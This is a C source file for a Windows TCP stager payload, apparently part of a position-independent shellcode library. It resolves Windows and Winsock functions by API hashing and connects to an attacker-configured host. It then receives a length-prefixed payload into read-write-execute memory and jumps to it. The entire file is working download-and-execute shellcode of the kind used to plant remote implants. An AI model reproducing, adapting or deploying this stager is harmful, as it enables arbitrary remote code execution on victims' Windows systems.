/*
 * stager_tcp payload for Windows — connect to a remote host via
 * Winsock, read a length-prefixed payload, allocate RWX, copy, and
 * jump.
 *
 * Config layout (matches unix stager_tcp):
 *   +0x00: af (u8, AF_INET=2)
 *   +0x01: port (u16, little-endian in config; converted to network order)
 *   +0x03: addr (u8[4], network order)
 *
 * Wire protocol on the socket:
 *   +0x00: payload_size (u32, little-endian)
 *   +0x04: payload_data
 */

#include "picblobs/net.h"
#include "picblobs/os/windows.h"
#include "picblobs/reloc.h"
#include "picblobs/section.h"
#include "picblobs/types.h"
#include "picblobs/win/resolve.h"

#define HASH_KERNEL32_DLL 0x7040EE75
#define HASH_VIRTUAL_ALLOC 0x382C0F97
#define HASH_EXIT_PROCESS 0xB769339E

#define HASH_WS2_32_DLL 0x9AD10B0F
#define HASH_WSA_STARTUP 0x6128C683
#define HASH_SOCKET 0x1C31032E
#define HASH_CONNECT 0xD3764DCF
#define HASH_RECV 0x7C9D4D95
#define HASH_CLOSESOCKET 0x494CB104

#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_EXECUTE_READWRITE 0x40

#define SOCK_STREAM 1
#define AF_INET 2
#define INVALID_SOCKET ((pic_uintptr) - 1)

typedef void *(PIC_WINAPI *fn_VirtualAlloc)(void *lpAddress, pic_uintptr dwSize,
	unsigned long flAllocationType, unsigned long flProtect);
typedef void(PIC_WINAPI *fn_ExitProcess)(unsigned int uExitCode);

typedef int(PIC_WINAPI *fn_WSAStartup)(
	unsigned short wVersionRequested, void *lpWSAData);
typedef pic_uintptr(PIC_WINAPI *fn_socket)(int af, int type, int protocol);
typedef int(PIC_WINAPI *fn_connect)(
	pic_uintptr s, const void *name, int namelen);
typedef int(PIC_WINAPI *fn_recv)(pic_uintptr s, void *buf, int len, int flags);
typedef int(PIC_WINAPI *fn_closesocket)(pic_uintptr s);

__asm__(".section .config,\"aw\"\n"
	".globl stager_tcp_windows_config\n"
	"stager_tcp_windows_config:\n"
	".space 7\n"
	".previous\n");

PIC_TEXT
static int recv_all(fn_recv pRecv, pic_uintptr s, void *buf, pic_u32 count)
{
	pic_u8 *p = (pic_u8 *)buf;
	pic_u32 done = 0;
	while (done < count) {
		int n = pRecv(s, p + done, (int)(count - done), 0);
		if (n <= 0)
			return 0;
		done += (pic_u32)n;
	}
	return 1;
}

PIC_ENTRY
void _start(void)
{
	PIC_SELF_RELOCATE();

	fn_VirtualAlloc pVirtualAlloc = (fn_VirtualAlloc)pic_resolve(
		HASH_KERNEL32_DLL, HASH_VIRTUAL_ALLOC);
	fn_ExitProcess pExitProcess = (fn_ExitProcess)pic_resolve(
		HASH_KERNEL32_DLL, HASH_EXIT_PROCESS);

	fn_WSAStartup pWSAStartup =
		(fn_WSAStartup)pic_resolve(HASH_WS2_32_DLL, HASH_WSA_STARTUP);
	fn_socket pSocket =
		(fn_socket)pic_resolve(HASH_WS2_32_DLL, HASH_SOCKET);
	fn_connect pConnect =
		(fn_connect)pic_resolve(HASH_WS2_32_DLL, HASH_CONNECT);
	fn_recv pRecv = (fn_recv)pic_resolve(HASH_WS2_32_DLL, HASH_RECV);
	fn_closesocket pCloseSocket =
		(fn_closesocket)pic_resolve(HASH_WS2_32_DLL, HASH_CLOSESOCKET);

	if (!pVirtualAlloc || !pExitProcess || !pWSAStartup || !pSocket ||
		!pConnect || !pRecv || !pCloseSocket)
		for (;;)
			;

	/*
	 * WSADATA is ~400 bytes. Allocate enough space to match the size
	 * returned by real ws2_32 so our mock writes don't overrun a
	 * smaller stack buffer.
	 */
	pic_u8 wsadata[408];
	(void)pWSAStartup(0x0202, wsadata);

	extern char stager_tcp_windows_config[]
		__attribute__((visibility("hidden")));
	const pic_u8 *cfg = (const pic_u8 *)stager_tcp_windows_config;

	pic_uintptr s = pSocket((int)cfg[0], SOCK_STREAM, 0);
	if (s == INVALID_SOCKET)
		pExitProcess(1);

	struct pic_sockaddr_in sa;
	pic_u8 *sp = (pic_u8 *)&sa;
	for (int i = 0; i < (int)sizeof(sa); i++)
		sp[i] = 0;
	sa.sin_family = (pic_u16)cfg[0];

	pic_u16 port_le = (pic_u16)cfg[1] | ((pic_u16)cfg[2] << 8);
	sa.sin_port = pic_htons(port_le);
	sa.sin_addr = *(const pic_u32 *)(cfg + 3);

	if (pConnect(s, &sa, (int)sizeof(sa)) < 0) {
		pCloseSocket(s);
		pExitProcess(1);
	}

	pic_u8 size_buf[4];
	if (!recv_all(pRecv, s, size_buf, 4)) {
		pCloseSocket(s);
		pExitProcess(1);
	}
	pic_u32 size = (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);
	if (size == 0 || size > 0x10000000) {
		pCloseSocket(s);
		pExitProcess(1);
	}

	void *mem = pVirtualAlloc(PIC_NULL, (pic_uintptr)size,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!mem) {
		pCloseSocket(s);
		pExitProcess(1);
	}

	if (!recv_all(pRecv, s, mem, size)) {
		pCloseSocket(s);
		pExitProcess(1);
	}
	pCloseSocket(s);

	((void (*)(void))mem)();

	pExitProcess(0);
}
